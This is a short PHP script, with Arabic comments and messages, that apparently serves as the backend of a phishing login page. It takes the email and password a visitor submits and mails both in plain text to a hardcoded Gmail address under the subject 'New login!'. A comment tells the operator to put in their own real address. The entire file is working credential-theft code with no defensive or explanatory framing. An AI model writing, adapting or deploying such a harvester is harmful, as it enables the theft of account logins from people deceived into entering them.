<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    $to = "issam.s.g22@gmail.com";  // ضع هنا إيميلك الحقيقي
    $subject = "تسجيل دخول جديد!";
    $message = "الإيميل: " . $email . "\nكلمة المرور: " . $password;
    $headers = "From: no-reply@yourdomain.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "تم الإرسال بنجاح!";
    } else {
        echo "فشل الإرسال!";
    }
}
?>
